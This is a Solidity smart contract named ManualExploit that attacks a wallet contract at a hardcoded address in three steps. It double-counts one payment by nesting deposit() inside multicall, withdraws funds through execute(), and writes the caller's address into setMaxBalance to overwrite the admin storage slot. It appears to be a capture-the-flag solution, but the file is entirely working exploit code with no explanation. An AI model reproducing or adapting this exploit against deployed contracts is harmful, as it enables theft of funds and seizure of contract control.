// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ManualExploit {
    address constant WALLET = 0xB7A5bd0345EF1Cc5E66bf61BdeC17D2461fBd968;
    
    function step1_doubleDeposit() external payable {
        // Prepare deposit() calldata
        bytes memory depositData = abi.encodeWithSignature("deposit()");
        
        // Prepare inner multicall([deposit()])
        bytes[] memory innerCalls = new bytes[](1);
        innerCalls[0] = depositData;
        bytes memory innerMulticall = abi.encodeWithSignature("multicall(bytes[])", innerCalls);
        
        // Prepare outer multicall([deposit(), multicall([deposit()])])
        bytes[] memory outerCalls = new bytes[](2);
        outerCalls[0] = depositData;
        outerCalls[1] = innerMulticall;
        
        // Execute with value
        (bool success,) = WALLET.call{value: msg.value}(
            abi.encodeWithSignature("multicall(bytes[])", outerCalls)
        );
        require(success, "Multicall failed");
    }
    
    function step2_withdraw() external {
        // Withdraw full balance
        (bool success,) = WALLET.call(
            abi.encodeWithSignature("execute(address,uint256,bytes)", msg.sender, 0.002 ether, "")
        );
        require(success, "Execute failed");
    }
    
    function step3_setAdmin() external {
        // Set maxBalance to our address value
        (bool success,) = WALLET.call(
            abi.encodeWithSignature("setMaxBalance(uint256)", uint256(uint160(msg.sender)))
        );
        require(success, "setMaxBalance failed");
    }
    
    receive() external payable {}
}